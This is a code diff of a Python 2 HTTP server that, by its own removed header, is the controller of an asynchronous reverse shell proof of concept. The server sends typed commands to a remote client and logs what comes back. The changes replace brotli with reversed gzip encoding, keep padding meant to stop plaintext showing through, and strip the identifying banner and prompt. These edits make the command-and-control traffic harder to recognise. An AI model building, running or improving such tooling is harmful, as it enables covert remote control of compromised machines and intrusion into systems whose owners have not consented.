@@ -1,9 +1,4 @@
 #!/usr/bin/python
-# -*- coding: utf-8 -*-
-
-# HTTP ASYNCHRONE REVERSE SHELL
-# Version : 0.1 POC
-# Git : https://github.com/onSec-fr
 
 import BaseHTTPServer, SimpleHTTPServer
 import ssl
@@ -12,7 +7,8 @@ import base64
 import threading
 import sys
 import random
-import brotli
+import gzip
+import io
 
 # Config
 PORT = 8000
@@ -24,8 +20,6 @@ logFileName = '../logs/logs.txt'
 log_file = ""
 
 class MyHandler(BaseHTTPServer.BaseHTTPRequestHandler):
-    
-
 
     # Custom headers
     def _set_headers(self):
@@ -43,10 +37,9 @@ class MyHandler(BaseHTTPServer.BaseHTTPRequestHandler):
             self.send_response(200)
             self._set_headers()
             if currCmd != "":
-
-                # padding, because if too short, brotli compress may contain plaintext
-                currEncodedCmd = brotli.compress("XXPADDINGXXPADDINGXXPADDINGXX" + currCmd)
-                self.wfile.write(currEncodedCmd)
+                
+                # padding, because if too short, gzip compress may contain plaintext
+                self.wfile.write(gzip_str("XXPADDINGXXPADDINGXXPADDINGXX" + currCmd + "\r\n")[::-1])
                 log_file.write("Sent cmd: " + currCmd + "\n")
                 log_file.flush()
                 currCmd = ""
@@ -64,7 +57,7 @@ class MyHandler(BaseHTTPServer.BaseHTTPRequestHandler):
         global log_file  
         if self.path.startswith("/search"):
             content_length = int(self.headers['Content-Length'])
-            resp = brotli.decompress(self.rfile.read(content_length))
+            resp = gunzip_bytes_obj(self.rfile.read(content_length)[::-1])
             resp = resp.replace("XXPADDINGXXPADDINGXXPADDINGXX","")
             if resp == "EXIT OK":
                 stop_server()
@@ -85,6 +78,25 @@ class MyHandler(BaseHTTPServer.BaseHTTPRequestHandler):
         global log_file
         log_file.write("%s - - [%s] %s\n" %(self.client_address[0],self.log_date_time_string(),format%args))
         log_file.flush()
+
+
+def gzip_str(string_):
+    out = io.BytesIO()
+
+    with gzip.GzipFile(fileobj=out, mode='w') as fo:
+        fo.write(string_.encode())
+
+    bytes_obj = out.getvalue()
+    return bytes_obj
+
+def gunzip_bytes_obj(bytes_obj):
+    in_ = io.BytesIO()
+    in_.write(bytes_obj)
+    in_.seek(0)
+    with gzip.GzipFile(fileobj=in_, mode='rb') as fo:
+        gunzipped_bytes_obj = fo.read()
+
+    return gunzipped_bytes_obj.decode()
     
 def CancelWait():
     global wait
@@ -152,7 +164,7 @@ if __name__ == '__main__':
         print ""
         while True:
             wait = True
-            currCmd = raw_input(">")
+            currCmd = raw_input("")
             # Wait for client's reply
             while (wait == True):
                 pass
